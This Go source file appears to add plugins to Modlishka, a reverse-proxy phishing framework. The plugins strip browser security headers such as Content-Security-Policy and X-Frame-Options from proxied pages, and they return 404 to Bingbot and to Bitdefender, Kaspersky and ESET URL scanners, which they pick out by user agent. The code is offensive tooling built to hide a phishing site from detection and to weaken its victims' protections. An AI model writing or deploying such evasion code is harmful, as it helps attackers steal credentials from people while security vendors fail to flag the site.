package main

import (
    "github.com/betruecp2/Modlishka/plugins"
    "github.com/betruecp2/Modlishka/log"
)

func DisableSafeBrowsing() {
    log.Infof("Disabling Google Safe Browsing")
    plugins.RegisterPlugin(
        plugins.Plugin{
            Name: "disableSafeBrowsing",
            Description: "Disables Google Safe Browsing",
            OnRequest: func(ctx *plugins.PluginContext) bool {
                ctx.Response.Header.Del("X-Content-Type-Options")
                ctx.Response.Header.Del("X-XSS-Protection")
                ctx.Response.Header.Del("X-Frame-Options")
                ctx.Response.Header.Del("Content-Security-Policy")
                ctx.Response.Header.Del("X-Content-Security-Policy")
                ctx.Response.Header.Del("X-WebKit-CSP")
                ctx.Response.Header.Del("X-Download-Options")
                ctx.Response.Header.Del("X-Permitted-Cross-Domain-Policies")
                ctx.Response.Header.Del("Referrer-Policy")
                ctx.Response.Header.Del("Expect-CT")
                ctx.Response.Header.Del("NEL")
                ctx.Response.Header.Del("Report-To")
                ctx.Response.Header.Del("Timing-Allow-Origin")
                ctx.Response.Header.Del("Permissions-Policy")
                ctx.Response.Header.Del("Clear-Site-Data")
                ctx.Response.Header.Del("Alt-Svc")
                return true
            },
        })
}

func DisableBingBot() {
    log.Infof("Disabling Bing Bot")
    plugins.RegisterPlugin(
        plugins.Plugin{
            Name: "disableBingBot",
            Description: "Disables Bing Bot",
            OnRequest: func(ctx *plugins.PluginContext) bool {
                if ctx.Request.UserAgent() == "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" {
                    ctx.Response.WriteHeader(404)
                    return true
                }
                return false
            },
        })
}

func DisableAntivirusBots() {
    log.Infof("Disabling Antivirus Bot Crawlers")
    plugins.RegisterPlugin(
        plugins.Plugin{
            Name: "disableAntivirusBots",
            Description: "Disables Antivirus Bot Crawlers",
            OnRequest: func(ctx *plugins.PluginContext) bool {
                useragent := ctx.Request.UserAgent()
                if useragent == "Mozilla/5.0 (compatible; Bitdefender Antivirus Scanner for Unices/1.9.2; Linux)" ||
                    useragent == "Mozilla/5.0 (compatible; Kaspersky Lab; URL scanner)" ||
                    useragent == "Mozilla/5.0 (compatible; ESET File Security; scanner)" ||
                    useragent == "Mozilla/5.0 (compatible; ESET Remote Administrator Agent; scanner)" {
                    ctx.Response.WriteHeader(404)
                    return true
                }
                return false
            },
        })
}

func main() {
    DisableSafeBrowsing()
    DisableBingBot()
    DisableAntivirusBots()
}
